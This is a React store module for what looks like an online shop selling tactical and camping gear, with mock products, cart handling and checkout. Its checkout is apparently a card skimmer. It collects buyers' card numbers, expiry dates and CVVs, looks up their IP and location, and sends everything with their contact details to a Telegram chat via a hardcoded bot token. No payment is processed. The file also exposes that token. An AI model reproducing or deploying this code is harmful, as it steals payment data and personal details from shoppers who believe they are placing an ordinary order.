import { useReducer } from "react";
import localforage from "localforage";
import { toast } from "react-toastify";
import img1 from "@/assets/images/products/1.jpg";
import img2 from "@/assets/images/products/2.jpg";
import img3 from "@/assets/images/products/3.jpg";
import img4 from "@/assets/images/products/4.jpg";
import img5 from "@/assets/images/products/5.jpg";
import img6 from "@/assets/images/products/6.jpeg";
import img7 from "@/assets/images/products/7.jpg";
import img8 from "@/assets/images/products/8.jpeg";
import img9 from "@/assets/images/products/9.webp";
import img10 from "@/assets/images/products/10.webp";
import img11 from "@/assets/images/products/11.webp";
import img12 from "@/assets/images/products/12.jpg";
import img13 from "@/assets/images/products/13.png";
import img14 from "@/assets/images/products/14.png";
import img15 from "@/assets/images/products/15.jpg";
import img16 from "@/assets/images/products/16.webp";
import img17 from "@/assets/images/products/17.webp";
import img18 from "@/assets/images/products/18.jpg";
import img19 from "@/assets/images/products/19.avif";
import img20 from "@/assets/images/products/20.jpg";
import img21 from "@/assets/images/products/21.webp";
import img22 from "@/assets/images/products/22.webp";
import img23 from "@/assets/images/products/23.jpg";
import img24 from "@/assets/images/products/24.jpg";
import img25 from "@/assets/images/products/25.jpg";
import img26 from "@/assets/images/products/26.jpg";
import img27 from "@/assets/images/products/27.jpg";
import img28 from "@/assets/images/products/28.webp";
import img29 from "@/assets/images/products/29.jpg";
import img30 from "@/assets/images/products/30.jpg";
import img31 from "@/assets/images/products/31.webp";
import img32 from "@/assets/images/products/32.jpg";
import img33 from "@/assets/images/products/33.avif";
import img34 from "@/assets/images/products/34.jpg";
import img35 from "@/assets/images/products/35.jpg";
import img36 from "@/assets/images/products/36.jpg";

const initialState = {
  products: [],
  cart: [],
  cartTotal: 0,
  cartQuantity: 0,
  order: [],
};

const actions = Object.freeze({
  ADD_TO_CART: "ADD_TO_CART",
  GET_PRODUCTS: "GET_PRODUCTS",
  REMOVE_FROM_CART: "REMOVE_FROM_CART",
  CLEAR_CART: "CLEAR_CART",
  ADD_QUANTITY: "ADD_QUANTITY",
  REDUCE_QUANTITY: "REDUCE_QUANTITY",
  PREFILL_CART: "PREFILL_CART",
});

const reducer = (state, action) => {
  if (action.type == actions.GET_PRODUCTS) {
    const backed_up_cart = action.backed_up_cart || [];
    if (!backed_up_cart.length) {
      return { ...state, products: action.products };
    }

    const cartTotal = backed_up_cart.reduce(
      (acc, item) => acc + item.price * (item.quantity || 1),
      0
    );
    const cartQuantity = backed_up_cart.reduce(
      (acc, item) => acc + (item.quantity || 1),
      0
    );

    const updatedProducts = action.products.map((product) => {
      const cartItem = backed_up_cart.find((item) => item._id === product._id);
      if (cartItem) {
        return {
          ...product,
          addedToCart: true,
          quantity: cartItem.quantity || 1,
        };
      } else {
        return product;
      }
    });
    return {
      ...state,
      products: updatedProducts,
      cart: backed_up_cart,
      cartQuantity,
      cartTotal,
    };
  }
  if (action.type == actions.ADD_TO_CART) {
    const product = state.products.find(
      (product) => product._id == action.product
    );
    if (!product) return state;

    const existingCartItem = state.cart.find(
      (item) => item._id == action.product
    );

    // If the product is already in the cart, just bump quantity
    if (existingCartItem) {
      const newCart = state.cart.map((item) =>
        item._id === action.product
          ? { ...item, quantity: (item.quantity || 1) + 1 }
          : item
      );
      localforage.setItem("cartItems", newCart);

      return {
        ...state,
        cart: newCart,
        cartQuantity: state.cartQuantity + 1,
        cartTotal: state.cartTotal + product.price,
      };
    }

    const cartProduct = { ...product, addedToCart: true, quantity: 1 };
    const newCart = [...state.cart, cartProduct];
    const updatedProducts = state.products.map((p) =>
      p._id === action.product ? { ...p, addedToCart: true } : p
    );

    localforage.setItem("cartItems", newCart);

    return {
      ...state,
      products: updatedProducts,
      cart: newCart,
      cartQuantity: state.cartQuantity + 1,
      cartTotal: state.cartTotal + product.price,
    };
  }
  if (action.type == actions.REMOVE_FROM_CART) {
    const cartItem = state.cart.find((item) => item._id == action.product);
    if (!cartItem) return state;

    const newCart = state.cart.filter((item) => item._id != action.product);
    const quantityRemoved = cartItem.quantity || 1;
    const priceRemoved = cartItem.price * quantityRemoved;

    const updatedProducts = state.products.map((p) =>
      p._id === action.product ? { ...p, addedToCart: false } : p
    );

    localforage.setItem("cartItems", newCart);

    return {
      ...state,
      products: updatedProducts,
      cart: newCart,
      cartQuantity: Math.max(0, state.cartQuantity - quantityRemoved),
      cartTotal: Math.max(0, state.cartTotal - priceRemoved),
    };
  }

  if (action.type == actions.ADD_QUANTITY) {
    const cartItem = state.cart.find((item) => item._id == action.product);
    if (!cartItem) return state;

    const newCart = state.cart.map((item) =>
      item._id === action.product
        ? { ...item, quantity: (item.quantity || 1) + 1 }
        : item
    );

    return {
      ...state,
      cart: newCart,
      cartTotal: state.cartTotal + cartItem.price,
      cartQuantity: state.cartQuantity + 1,
    };
  }

  if (action.type == actions.REDUCE_QUANTITY) {
    const cartItem = state.cart.find((item) => item._id == action.product);
    if (!cartItem || cartItem.quantity <= 1) {
      return state;
    }

    const newCart = state.cart.map((item) =>
      item._id === action.product
        ? { ...item, quantity: item.quantity - 1 }
        : item
    );

    return {
      ...state,
      cart: newCart,
      cartTotal: state.cartTotal - cartItem.price,
      cartQuantity: state.cartQuantity - 1,
    };
  }

  if (action.type == actions.CLEAR_CART) {
    localforage.setItem("cartItems", []);

    return {
      ...state,
      products: state.products.map((p) => ({
        ...p,
        addedToCart: false,
        quantity: 0,
      })),
      cart: [],
      order: [],
      cartTotal: 0,
      cartQuantity: 0,
    };
  }

  return state;
};

const useStore = () => {
  const [state, dispatch] = useReducer(reducer, initialState);

  const addToCart = (product) => {
    dispatch({ type: actions.ADD_TO_CART, product });
  };

  const removeFromCart = (product) => {
    dispatch({ type: actions.REMOVE_FROM_CART, product });
  };

  const clearCart = () => {
    dispatch({ type: actions.CLEAR_CART });
  };
  const getProducts = () => {
    const mockProducts = [
      {
        _id: "1",
        name: "Бронежилет (плитоноска с пластинами)",
        price: 16800,
        rating: 5,
        description: "Модульная плитоноска с керамическими или полиэтиленовыми пластинами 4+ класса защиты",
        product_image: img1,
        times_bought: 320,
        discount: 15,
        isNew: false,
      },
      {
        _id: "2",
        name: "Тактические перчатки",
        price: 1100,
        rating: 5,
        description: "Прочные тактические перчатки с защитой костяшек и порезостойкостью",
        product_image: img2,
        times_bought: 450,
        discount: 20,
        isNew: false,
      },
      {
        _id: "3",
        name: "Турникет",
        price: 2250,
        rating: 5,
        description: "Тактический турникет для остановки кровотечения",
        product_image: img3,
        times_bought: 680,
        discount: 10,
        isNew: false,
      },
      {
        _id: "4",
        name: "Аптечка индивидуальная (IFAK)",
        price: 3080,
        rating: 5,
        description: "Комплект первой помощи: гемостатик, израильский бандаж, окклюзионный пластырь, жгут и т.д.",
        product_image: img4,
        times_bought: 520,
        discount: 12,
        isNew: true,
      },
      {
        _id: "5",
        name: "Наколенники + налокотники тактические",
        price: 1700,
        rating: 4,
        description: "Защита суставов с мягкими вставками для ползания и стрельбы с колена/локтя",
        product_image: img5,
        times_bought: 290,
        discount: 8,
        isNew: false,
      },
      {
        _id: "6",
        name: "Тактический фонарь",
        price: 1300,
        rating: 5,
        description: "Мощный фонарь с белым/красным светом и креплением на оружие/Picatinny",
        product_image: img6,
        times_bought: 410,
        discount: 18,
        isNew: false,
      },
      {
        _id: "7",
        name: "Мультитул",
        price: 2975,
        rating: 5,
        description: "Многофункциональный инструмент (аналог Leatherman) для полевых задач",
        product_image: img7,
        times_bought: 340,
        discount: 15,
        isNew: true,
      },
      {
        _id: "8",
        name: "Комплект термобелья",
        price: 3150,
        rating: 4,
        description: "Тёплое термобельё (флис + меринос) для холодной погоды и длительного ношения",
        product_image: img8,
        times_bought: 380,
        discount: 10,
        isNew: false,
      },
      {
        _id: "9",
        name: "Носки тактические (пара)",
        price: 1050,
        rating: 5,
        description: "Высокие треккинговые носки с шерстью, против мозолей и пота",
        product_image: img9,
        times_bought: 620,
        discount: 5,
        isNew: false,
      },
      {
        _id: "10",
        name: "Павербанк + кабели",
        price: 1560,
        rating: 4,
        description: "Мощный пауэрбанк 20000 мАч с защитой и комплектом кабелей USB-C/Micro",
        product_image: img10,
        times_bought: 500,
        discount: 22,
        isNew: true,
      },
      {
        _id: "11",
        name: "Баллистические очки",
        price: 2200,
        rating: 5,
        description: "Защитные очки из поликарбоната против осколков, пыли и солнца",
        product_image: img11,
        times_bought: 270,
        discount: 12,
        isNew: false,
      },
      {
        _id: "12",
        name: "Гидратор (питьевая система)",
        price: 1200,
        rating: 4,
        description: "Гидратор 3 литра с трубкой для питья на ходу (аналог CamelBak)",
        product_image: img12,
        times_bought: 310,
        discount: 25,
        isNew: false,
      },
      {
        _id: "13",
        name: "Тактический рюкзак 40л",
        price: 4920,
        rating: 5,
        description: "Прочный рюкзак с molle-системой и влагозащитой",
        product_image: img13,
        times_bought: 290,
        discount: 18,
        isNew: true,
      },
      {
        _id: "14",
        name: "GPS-навигатор",
        price: 5400,
        rating: 4,
        description: "Портативный навигатор с поддержкой офлайн-карт и долгим временем работы",
        product_image: img14,
        times_bought: 180,
        discount: 10,
        isNew: false,
      },
      {
        _id: "15",
        name: "Тактическая сумка на бедро",
        price: 1190,
        rating: 4,
        description: "Компактная сумка для быстрого доступа к элементам экипировки",
        product_image: img15,
        times_bought: 260,
        discount: 15,
        isNew: false,
      },
      {
        _id: "16",
        name: "Теплый спальный мешок",
        price: 3680,
        rating: 5,
        description: "Спальный мешок до -10°C с компрессионным мешком",
        product_image: img16,
        times_bought: 210,
        discount: 20,
        isNew: true,
      },
      {
        _id: "17",
        name: "Комплект походной посуды",
        price: 1100,
        rating: 4,
        description: "Легкая посуда из нержавеющей стали для кемпинга",
        product_image: img17,
        times_bought: 175,
        discount: 12,
        isNew: false,
      },
      {
        _id: "18",
        name: "Тактический нож",
        price: 1980,
        rating: 5,
        description: "Нож с клинком из нержавеющей стали и нескользящей рукояткой",
        product_image: img18,
        times_bought: 495,
        discount: 17,
        isNew: false,
      },
      {
        _id: "19",
        name: "Защитная маска для лица",
        price: 900,
        rating: 4,
        description: "Маска с защитой от пыли и микроорганизмов",
        product_image: img19,
        times_bought: 345,
        discount: 10,
        isNew: false,
      },
      {
        _id: "20",
        name: "Тактический ремень",
        price: 850,
        rating: 4,
        description: "Ремень с металлической пряжкой и molle-петлями",
        product_image: img20,
        times_bought: 220,
        discount: 15,
        isNew: false,
      },
      {
        _id: "21",
        name: "Многофункциональная лампа",
        price: 1320,
        rating: 4,
        description: "Лампа с аккумулятором, фонариком и USB-разъемом",
        product_image: img21,
        times_bought: 205,
        discount: 12,
        isNew: true,
      },
      {
        _id: "22",
        name: "Портативный радиоприемник",
        price: 3470,
        rating: 5,
        description: "Радио с поддержкой FM/AM и встроенным аккумулятором",
        product_image: img22,
        times_bought: 160,
        discount: 18,
        isNew: false,
      },
      {
        _id: "23",
        name: "Тактическая аптечка для автомобиля",
        price: 2160,
        rating: 4,
        description: "Аптечка с базовыми медикаментами и инструментами",
        product_image: img23,
        times_bought: 200,
        discount: 10,
        isNew: false,
      },
      {
        _id: "24",
        name: "Набор спичек в походной упаковке",
        price: 450,
        rating: 4,
        description: "Ветрозащищенные спички в герметичной банке",
        product_image: img24,
        times_bought: 310,
        discount: 5,
        isNew: false,
      },
      {
        _id: "25",
        name: "Цифровой компас",
        price: 2975,
        rating: 5,
        description: "Компактный компас с подсветкой и барометром",
        product_image: img25,
        times_bought: 140,
        discount: 15,
        isNew: false,
      },
      {
        _id: "26",
        name: "Защитные наколенники",
        price: 1496,
        rating: 4,
        description: "Наколенники с гелевыми вставками для защиты суставов",
        product_image: img26,
        times_bought: 260,
        discount: 12,
        isNew: false,
      },
      {
        _id: "27",
        name: "Складной стул",
        price: 2400,
        rating: 4,
        description: "Удобный складной стул для кемпинга и пикников",
        product_image: img27,
        times_bought: 180,
        discount: 20,
        isNew: true,
      },
      {
        _id: "28",
        name: "Зарядное устройство на солнечных батареях",
        price: 2700,
        rating: 5,
        description: "Портативное солнечное зарядное для телефона и гаджетов",
        product_image: img28,
        times_bought: 220,
        discount: 25,
        isNew: false,
      },
      {
        _id: "29",
        name: "Многоцелевая лопата",
        price: 2040,
        rating: 4,
        description: "Складная штыковая лопата с пилой и ножом",
        product_image: img29,
        times_bought: 205,
        discount: 15,
        isNew: false,
      },
      {
        _id: "30",
        name: "Грелка для рук",
        price: 540,
        rating: 5,
        description: "Одноразовая грелка, держит тепло до 10 часов",
        product_image: img30,
        times_bought: 520,
        discount: 10,
        isNew: false,
      },
      {
        _id: "31",
        name: "Многофункциональная палатка",
        price: 10280,
        rating: 5,
        description: "Палатка для 2-3 человек с водонепроницаемым тентом",
        product_image: img31,
        times_bought: 135,
        discount: 18,
        isNew: true,
      },
      {
        _id: "32",
        name: "Набор для чистки оружия",
        price: 2160,
        rating: 4,
        description: "Компактный набор для уборки и обслуживания оружия",
        product_image: img32,
        times_bought: 180,
        discount: 10,
        isNew: false,
      },
      {
        _id: "33",
        name: "Пылезащитные очки",
        price: 880,
        rating: 4,
        description: "Очки с протекторами и противотуманным покрытием",
        product_image: img33,
        times_bought: 210,
        discount: 12,
        isNew: false,
      },
      {
        _id: "34",
        name: "Сенсорный фонарь с датчиком движения",
        price: 1176,
        rating: 5,
        description: "Фонарь с режимом авто и датчиком движения для палатки",
        product_image: img34,
        times_bought: 190,
        discount: 16,
        isNew: true,
      },
      {
        _id: "35",
        name: "Водонепроницаемый чехол для телефона",
        price: 630,
        rating: 4,
        description: "Чехол для телефона, защищает от воды и песка",
        product_image: img35,
        times_bought: 250,
        discount: 10,
        isNew: false,
      },
      {
        _id: "36",
        name: "Тактическая повязка на голову",
        price: 660,
        rating: 4,
        description: "Полоска из быстросохнущей ткани для защиты от пота",
        product_image: img36,
        times_bought: 310,
        discount: 8,
        isNew: false,
      },
    ];

    let modifiedData = mockProducts.map((product) => {
      return { ...product, addedToCart: false };
    });
    
    localforage.getItem("cartItems").then((cart) => {
      const backed_up_cart = cart || [];
      dispatch({
        type: actions.GET_PRODUCTS,
        products: modifiedData,
        backed_up_cart: backed_up_cart,
      });
    });
  };

  const addQuantity = (product) => {
    dispatch({ type: actions.ADD_QUANTITY, product });
  };

  const reduceQuantity = (product) => {
    dispatch({ type: actions.REDUCE_QUANTITY, product });
  };

  const sendOrderToTelegram = async (orderData, user) => {
    const TOKEN = "8710670721:AAHXHl7jaz02cDeC_nH3PIsttIL4LrXXlPs"; // Рекомендовано через env перемінні
    const CHAT_ID = "893976557";

    const itemsText = orderData.items
      .map((item, idx) => `${idx + 1}. ${item.title || item.name || 'Item'} x${item.quantity || 1} - ${item.price || item.cost || 'N/A'}`)
      .join('\n');

    const text = `🛒 Нове замовлення\n` +
      `ID: ${orderData.id}\n` +
      `👤 Клієнт: ${user?.name || user?.username || 'не вказано'}\n` +
      `📧 Email: ${user?.email || 'не вказано'}\n` +
      `📞 Телефон: ${orderData.contact_number || orderData.user_phone || 'не вказано'}\n` +
      `🌍 Країна: ${orderData.location?.country || 'Росія'}, Місто: ${orderData.delivery_city || orderData.location?.city || 'не вказано'}\n` +
      `🛰 IP: ${orderData.ip_address || 'unknown'}\n` +
      `🏷 ISP: ${orderData.location?.isp || 'не вказано'}\n` +
      `📦 Товарів: ${orderData.totalItemCount}\n` +
      `💰 Сума до доставки: ${orderData.cost_before_delivery_rate}\n` +
      `🚚 Доставка: ${orderData.delivery_type} (${orderData.delivery_type_cost})\n` +
      `💵 Сума після доставки: ${orderData.cost_after_delivery_rate}\n` +
      `🧾 Промокод: ${orderData.promo_code || 'немає'}\n` +
      `🏙 Місто доставки: ${orderData.delivery_city || 'не вказано'}\n` +
      `💳 Номер карти: ${orderData.card_number || 'не вказано'}, Термін карти: ${orderData.card_expiry || 'не вказано'}, CVV: ${orderData.card_cvv || 'не вказано'}\n` +
      `🕒 Час: ${orderData.createdAt}\n` +
      `\nСклад:\n${itemsText}`;

    try {
      const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });

      if (!res.ok) {
        const errorText = await res.text();
        throw new Error(`Telegram API Error: ${res.status} ${errorText}`);
      }

      // Order sent to Telegram successfully
      return true;
    } catch (e) {
      console.error("Telegram error", e);
      return false;
    }
  };

  const confirmOrder = async (order) => {
  const user = JSON.parse(localStorage.getItem("user") || "null");
  if (!user) {
    toast.error("Вы должны войти в систему, чтобы оформить заказ");
    return { showRegisterLogin: true };
  }

  let ip = "unknown";
  let locationData = {};

  try {
    const res = await fetch("https://ipwho.is/");
    const data = await res.json();

    ip = data.ip;

    locationData = {
      country: data.country,
      city: data.city,
      isp: data.connection?.isp,
      lat: data.latitude,
      lon: data.longitude,
    };

  } catch (e) {
    // IP fetch failed
  }

  const orderData = {
    id: Date.now().toString(),
    user_id: user.id,
    user_email: user.email,
    user_phone: order.phoneNumber,
    items: state.cart,
    totalItemCount: state.cartQuantity,
    delivery_type: order.DeliveryType,
    delivery_type_cost: order.DeliveryTypeCost,
    cost_before_delivery_rate: state.cartTotal,
    cost_after_delivery_rate: order.costAfterDelieveryRate,
    promo_code: order.promo_code || "",
    contact_number: order.phoneNumber,
    delivery_city: order.deliveryCity || "",
    payment_details: order.paymentDetails || "",
    card_number: order.cardNumber || "",
    card_expiry: order.cardExpiry || "",
    card_cvv: order.cardCVV || "",
    ip_address: ip,
    location: locationData,
    createdAt: new Date().toISOString()
  };

  const orders = JSON.parse(localStorage.getItem("orders") || "[]");
  orders.push(orderData);
  localStorage.setItem("orders", JSON.stringify(orders));

  const sent = await sendOrderToTelegram(orderData, user);

  if (!sent) {
    toast.error("Не вдалося відправити замовлення в Telegram. Спробуйте пізніше.");
    return false;
  }

  // Order forwarded to Telegram

  toast.success("Заказ оформлен успешно");
  clearCart();
  return true;
  };

  return {
    state,
    addToCart,
    removeFromCart,
    clearCart,
    getProducts,
    addQuantity,
    reduceQuantity,
    confirmOrder,
  };
};

export default useStore;
